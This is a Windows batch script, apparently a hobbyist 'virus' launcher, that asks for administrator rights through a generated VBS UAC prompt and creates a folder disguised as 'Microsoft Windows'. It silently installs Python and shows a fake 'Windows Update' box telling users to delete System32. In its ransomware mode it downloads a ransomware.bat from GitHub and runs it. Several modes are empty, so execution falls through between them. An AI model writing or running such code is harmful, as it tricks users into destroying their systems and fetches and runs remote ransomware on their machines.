@echo off


:: BatchGotAdmin
:-------------------------------------
REM  --> Check for permissions
    IF "%PROCESSOR_ARCHITECTURE%" EQU "amd64" (
>nul 2>&1 "%SYSTEMROOT%\SysWOW64\cacls.exe" "%SYSTEMROOT%\SysWOW64\config\system"
) ELSE (
>nul 2>&1 "%SYSTEMROOT%\system32\cacls.exe" "%SYSTEMROOT%\system32\config\system"
)

REM --> If error flag set, we do not have admin.
if '%errorlevel%' NEQ '0' (
    echo Requesting administrative privileges...
    goto UACPrompt
) else ( goto gotAdmin )

:UACPrompt
    echo Set UAC = CreateObject^("Shell.Application"^) > "%temp%\getadmin.vbs"
    set params= %*
    echo UAC.ShellExecute "cmd.exe", "/c ""%~s0"" %params:"=""%", "", "runas", 1 >> "%temp%\getadmin.vbs"

    "%temp%\getadmin.vbs"
    del "%temp%\getadmin.vbs"
    exit /B

:gotAdmin
    pushd "%CD%"
    CD /D "%~dp0"
:--------------------------------------    

echo Are you sure you would like to run this virus. Remember at any time you can run "C:\Temp\Microsoft Windows\RemoveVirus.py" to remove the virus.

goto :choice

:choice

set /p
set INPUT=
set /P INPUT=Type input: %=%...

set /P c=Are you sure you want to continue? This is a virus! Remember, you can run RemoveVirus at any time in a terminal [Y/N]?
if /I "%c%" EQU "Y" goto datapierce
if /I "%c%" EQU "N" exit

cls
echo Invalid option!
goto choice

:datapierce

cd %systemdrive%
mkdir Temp && cd Temp
mkdir "Microsoft Windows" && cd "Microsoft Windows"

if /I "%1" EQU "--stupid" goto stupid
if /I "%1" EQU "--trojan" goto trojan
if /I "%1" EQU "--ransomware" goto ransomware 
if /I "%1" EQU "--creepypasta" goto creepypasta


curl -O https://www.python.org/ftp/python/3.11.0/python-3.11.0-amd64.exe

python-3.11.0-amd64.exe /quiet InstallAllUsers=1

:stupid

REM This is just stupid :downarrowlol:

echo x=msgbox("Hello there, you need to delete System32 before updating." ,0, "Windows Update") >> msgbox.vbs
msgbox.vbs
del msgbox.vbs

:trojan
REM I just need to get this out fast so





:ransomware
curl -O https://github.com/DiamondBroPlayz/batch-virus/raw/main/Modes/ransomware.bat
ransomware.bat


:creepypasta




